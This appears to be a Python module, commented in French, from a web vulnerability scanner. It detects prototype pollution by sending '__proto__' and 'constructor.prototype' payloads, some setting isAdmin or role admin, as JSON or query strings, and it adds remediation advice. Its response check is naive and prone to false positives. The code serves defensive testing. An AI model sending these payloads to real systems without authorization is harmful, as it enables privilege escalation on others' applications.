"""
Détecteur de Prototype Pollution (JavaScript)
Vulnérabilité moderne affectant Node.js et frameworks JavaScript
"""

import asyncio
import json
from typing import Optional, List, Dict
from loguru import logger
import aiohttp

from core.models import Vulnerabilite


class DetecteurPrototypePollution:
    """
    Détecte les vulnérabilités Prototype Pollution
    Affecte principalement Node.js, Express, et frameworks JavaScript
    """

    def __init__(self, auth_config: Dict = None):
        """
        Initialise le détecteur
        
        Args:
            auth_config: Configuration d'authentification
        """
        self.auth_config = auth_config or {}
        
        # Payloads JSON pour prototype pollution
        self.payloads_json = [
            # __proto__ pollution
            {
                "__proto__": {
                    "polluted": "yes"
                }
            },
            {
                "__proto__": {
                    "isAdmin": True
                }
            },
            {
                "__proto__": {
                    "role": "admin"
                }
            },
            
            # constructor.prototype pollution
            {
                "constructor": {
                    "prototype": {
                        "polluted": "yes"
                    }
                }
            },
            
            # Nested pollution
            {
                "user": {
                    "__proto__": {
                        "isAdmin": True
                    }
                }
            },
        ]
        
        # Payloads query string
        self.payloads_query = [
            "__proto__[polluted]=yes",
            "constructor[prototype][polluted]=yes",
            "__proto__.polluted=yes",
            "constructor.prototype.polluted=yes",
        ]
        
        # Indicateurs de pollution réussie
        self.pollution_indicators = [
            'polluted',
            'isAdmin',
            'role',
            '__proto__',
            'constructor.prototype',
        ]

    async def detecter(self, url: str, params: Dict = None) -> List[Vulnerabilite]:
        """
        Détecte les vulnérabilités Prototype Pollution
        
        Args:
            url: URL à tester
            params: Paramètres découverts
            
        Returns:
            List[Vulnerabilite]: Vulnérabilités trouvées
        """
        vulnerabilites = []
        
        logger.info(f"🔍 Test Prototype Pollution: {url}")
        
        try:
            async with aiohttp.ClientSession(
                cookies=self.auth_config.get('cookies'),
                headers=self.auth_config.get('headers')
            ) as session:
                # Test 1: JSON payloads (POST)
                json_vulns = await self._test_json_pollution(session, url, params)
                vulnerabilites.extend(json_vulns)
                
                # Test 2: Query string payloads (GET)
                query_vulns = await self._test_query_pollution(session, url, params)
                vulnerabilites.extend(query_vulns)
        
        except Exception as e:
            logger.debug(f"Erreur test Prototype Pollution: {str(e)}")
        
        return vulnerabilites

    async def _test_json_pollution(
        self,
        session: aiohttp.ClientSession,
        url: str,
        params: Dict
    ) -> List[Vulnerabilite]:
        """Teste les payloads JSON"""
        vulnerabilites = []
        
        for payload in self.payloads_json:
            try:
                headers = {'Content-Type': 'application/json'}
                
                async with session.post(
                    url,
                    json=payload,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    contenu = await response.text()
                    
                    # Vérifier si la pollution a réussi
                    if self._is_polluted(contenu):
                        vulnerabilites.append(
                            Vulnerabilite(
                                type="Prototype_Pollution",
                                severite="HAUTE",
                                url=url,
                                description="Prototype Pollution via JSON. Peut mener à RCE, privilege escalation, ou DoS.",
                                payload=json.dumps(payload),
                                preuve=contenu[:400],
                                cvss_score=8.5,
                                remediation=self._get_remediation()
                            )
                        )
                        logger.success(f"✅ Prototype Pollution (JSON) trouvé")
                        break
            
            except Exception:
                continue
        
        return vulnerabilites

    async def _test_query_pollution(
        self,
        session: aiohttp.ClientSession,
        url: str,
        params: Dict
    ) -> List[Vulnerabilite]:
        """Teste les payloads query string"""
        vulnerabilites = []
        
        for payload in self.payloads_query:
            try:
                test_url = f"{url}?{payload}"
                
                async with session.get(
                    test_url,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    contenu = await response.text()
                    
                    if self._is_polluted(contenu):
                        vulnerabilites.append(
                            Vulnerabilite(
                                type="Prototype_Pollution",
                                severite="HAUTE",
                                url=url,
                                description="Prototype Pollution via Query String",
                                payload=payload,
                                preuve=contenu[:400],
                                cvss_score=8.0,
                                remediation=self._get_remediation()
                            )
                        )
                        logger.success(f"✅ Prototype Pollution (Query) trouvé")
                        break
            
            except Exception:
                continue
        
        return vulnerabilites

    def _is_polluted(self, contenu: str) -> bool:
        """Vérifie si le prototype a été pollué"""
        return any(ind in contenu for ind in self.pollution_indicators)

    def _get_remediation(self) -> str:
        """Recommandations de remediation"""
        return """
Remediation Prototype Pollution:

1. Utiliser Object.create(null) pour objets sans prototype
2. Valider et sanitizer toutes les propriétés d'objets
3. Utiliser Map au lieu d'objets pour données utilisateur
4. Freeze Object.prototype: Object.freeze(Object.prototype)
5. Utiliser --frozen-intrinsics flag (Node.js 12+)
6. Bloquer les clés dangereuses: __proto__, constructor, prototype
7. Utiliser des bibliothèques sécurisées (lodash v4.17.21+)
8. Validation de schéma stricte (JSON Schema)
9. Ne jamais merger directement des objets utilisateur
10. CSP strict pour limiter l'impact

Exemple sécurisé:
```javascript
// Au lieu de:
const merge = (target, source) => {
    for (let key in source) {
        target[key] = source[key];  // ❌ Dangereux
    }
};

// Utiliser:
const merge = (target, source) => {
    for (let key in source) {
        if (source.hasOwnProperty(key) && 
            !['__proto__', 'constructor', 'prototype'].includes(key)) {
            target[key] = source[key];  // ✅ Sûr
        }
    }
};
```

Références:
- PortSwigger Prototype Pollution Guide
- OWASP Prototype Pollution
- Snyk Prototype Pollution Prevention
"""


# Test
async def test_prototype_pollution():
    """Test du détecteur"""
    detector = DetecteurPrototypePollution()
    test_url = "http://localhost:3000/api/user"
    test_params = {'user': 'test'}
    
    vulns = await detector.detecter(test_url, test_params)
    print(f"{'✅' if vulns else '❌'} {len(vulns)} vulnérabilités Prototype Pollution trouvées")


if __name__ == "__main__":
    asyncio.run(test_prototype_pollution())
